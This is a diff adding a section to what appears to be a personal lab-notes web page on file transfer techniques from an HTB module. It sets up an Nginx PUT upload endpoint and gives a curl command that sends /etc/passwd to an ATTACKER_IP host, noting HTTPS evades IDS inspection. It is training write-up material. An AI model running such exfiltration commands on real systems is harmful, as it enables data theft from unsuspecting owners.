@@ -282,6 +282,59 @@ html
                 </div>
             </div>
 
+            <div class="section">
+                <h3>🌐 Catching Files over HTTP/S</h3>
+                <p>In another lab I flipped the direction: instead of pulling files from the target over RDP/SMB, I stood up my own HTTP endpoint and had compromised hosts <em>push</em> files to me using simple <code>PUT</code> requests. This pattern works well because HTTP/HTTPS is almost always allowed out through firewalls, and HTTPS hides sensitive data from casual IDS inspection.</p>
+
+                <h4>Nginx Upload Endpoint</h4>
+                <p>On my attack box, I created a minimal Nginx vhost that accepts uploads on a high port and drops them into a non-browsable directory:</p>
+
+                <div class="command-block">
+                    <code>sudo mkdir -p /var/www/uploads/SecretUploadDirectory</code>
+                </div>
+                <div class="command-block">
+                    <code>sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory</code>
+                </div>
+
+                <p>Upload site config (<code>/etc/nginx/sites-available/upload.conf</code>):</p>
+                <div class="command-block">
+<code>server {
+    listen 9001;
+
+    location /SecretUploadDirectory/ {
+        root        /var/www/uploads;
+        dav_methods PUT;
+    }
+}</code>
+                </div>
+
+                <div class="command-block">
+                    <code>sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/</code>
+                </div>
+                <div class="command-block">
+                    <code>sudo systemctl restart nginx.service</code>
+                </div>
+
+                <div class="warning-box">
+                    <strong>Port conflicts:</strong> If Nginx errors about port 80 already being in use, I either remove the default site (<code>sudo rm /etc/nginx/sites-enabled/default</code>) or keep my upload vhost on a non-standard port like <code>9001</code>.
+                </div>
+
+                <h4>Exfiltrating a File with curl</h4>
+                <p>Once the upload endpoint is live, any Linux host can exfiltrate a file with a single command:</p>
+                <div class="command-block">
+                    <code>curl -T /etc/passwd http://ATTACKER_IP:9001/SecretUploadDirectory/users.txt</code>
+                </div>
+
+                <p>On my server, I confirmed the file landed correctly:</p>
+                <div class="command-block">
+                    <code>sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt</code>
+                </div>
+
+                <div class="highlight-box">
+                    <strong>Defensive note:</strong> I keep directory listing disabled so someone hitting <code>/SecretUploadDirectory/</code> doesn’t get a full index of exfiltrated files. In real tests I’d also prefer HTTPS (self-signed if needed) so credentials and sensitive data aren’t traveling in cleartext.
+                </div>
+            </div>
+
             <!-- Misc methods + HTB module -->
             <div class="section">
                 <h3>🧰 Miscellaneous File Transfer Methods (HTB Module Practice)</h3>
@@ -351,6 +404,8 @@ html
                     <li><strong><code>net share</code> / <code>net use</code>:</strong> Native Windows commands used to create and map a temporary SMB network share for file transfer.</li>
                     <li><strong><code>robocopy</code>:</strong> Tested as a robust method for copying files locally and across mapped network shares.</li>
                     <li><strong><code>xfreerdp</code> / RDP:</strong> Used to mount local Linux folders into the RDP session via <code>/drive:</code> and transfer files through <code>\\tsclient\</code>.</li>
+                    <li><strong>Nginx:</strong> Configured a minimal upload-only vhost to receive files over HTTP/S using <code>dav_methods PUT</code>.</li>
+                    <li><strong><code>curl</code>:</strong> Used from Linux hosts to exfiltrate files directly to the Nginx upload endpoint.</li>
                 </ul>
             </div>
 
@@ -360,6 +415,7 @@ html
                     <li><a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest" target="_blank">Microsoft Docs: Invoke-WebRequest</a></li>
                     <li><a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/net-use" target="_blank">Microsoft Docs: Net Use Command</a></li>
                     <li><a href="https://www.freerdp.com/" target="_blank">FreeRDP / xfreerdp Documentation</a></li>
+                    <li><a href="https://nginx.org/en/docs/" target="_blank">Nginx Documentation</a></li>
                 </ul>
             </div>
         </div>
